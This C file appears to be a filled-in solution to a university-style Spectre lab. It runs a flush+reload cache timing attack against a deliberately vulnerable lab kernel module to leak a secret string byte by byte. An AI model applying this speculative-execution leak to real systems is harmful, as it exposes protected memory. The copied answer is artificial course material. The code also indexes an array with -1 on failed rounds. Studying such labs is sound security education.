/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel(int kernel_fd, char *shared_memory, size_t offset, uint64_t addr) {
    spectre_lab_command local_cmd;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;
    local_cmd.arg3 = addr;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

enum extremum_type {maximum = false, minimum = true};
#define CHAR_LIMIT 256
#define STEP 4096

/**
 * finds index of min element of uint array of positive length, ties broken by last appearance
*/
int extreme_index(uint64_t* arr, int arr_length, bool etype) {
    uint64_t min_value = arr[0];
    int min_index = 0;
    for (int i = 0; i < arr_length; ++i) {
        if ((arr[i] < min_value) == etype) {
            min_value = arr[i];
            min_index = i;
        }
    }
    return min_index;
}

/**
 * helper that does a single round of the flush reload thing
 * returns -1 if none are within the high_threshold
*/
int flush_reload(int kernel_fd, char *shared_memory, size_t current_offset, uint64_t high_threshold) {

    // original working training iterations was 200
    for (int i = 0; i < 30; ++i) {
        call_kernel(kernel_fd, shared_memory, 0, 0);
    }

    for (int i = 0; i < CHAR_LIMIT; ++i) {
        clflush(shared_memory + STEP * i);
    }

    call_kernel(kernel_fd, shared_memory, current_offset, 0);

    uint64_t access_times[CHAR_LIMIT];
    for (int i = 0; i < CHAR_LIMIT; ++i) {
        access_times[i] = time_access(shared_memory + STEP * i);
    }

    // printf("\ncurrent offset: %ld\n", current_offset);
    // for (int i = 0; i < CHAR_LIMIT; ++i) {
    //     printf("%d: %ld\n", i, access_times[i]);
    // }

    for (int i = 0; i < CHAR_LIMIT; ++i) {
        if (access_times[i] <= high_threshold) return i;
    }
    return -1;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??

        uint64_t frequencies[CHAR_LIMIT] = {0};
        for (int i = 0; i < 100; ++i) {
            int index = flush_reload(kernel_fd, shared_memory, current_offset, 100);
            frequencies[index] += (index >= 0);
        }
        leaked_byte = (char)extreme_index(frequencies, CHAR_LIMIT, maximum);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
